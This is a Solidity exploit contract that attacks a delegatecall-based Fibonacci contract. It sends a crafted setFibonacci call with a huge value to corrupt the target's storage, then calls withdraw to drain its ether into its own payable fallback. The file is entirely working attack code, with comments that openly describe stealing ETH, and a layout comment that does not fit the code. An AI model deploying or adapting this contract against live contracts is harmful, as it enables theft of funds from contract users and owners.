pragma solidity ^0.4.22;

// Exploit Contract
contract FibonacciExploit {
    address public target;
    // mimic layout to hijack storage slots
    address public fibonacciLibrary;
    uint public calculatedFibNumber;
    uint public start;
    uint public withdrawalCounter;

    constructor(address _target) public {
        target = _target;
    }

    // Craft payload to set calculatedFibNumber to a large value
    function attack() public {
        // This encodes a call to `setFibonacci(uint256)` with a very high n
        bytes memory payload = abi.encodeWithSignature("setFibonacci(uint256)", 1000000);
        target.call(payload); // Triggers fallback => delegatecall => writes huge `calculatedFibNumber`

        // Now call withdraw to steal huge amount of ETH
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    // fallback to receive stolen ether
    function () public payable {}
}

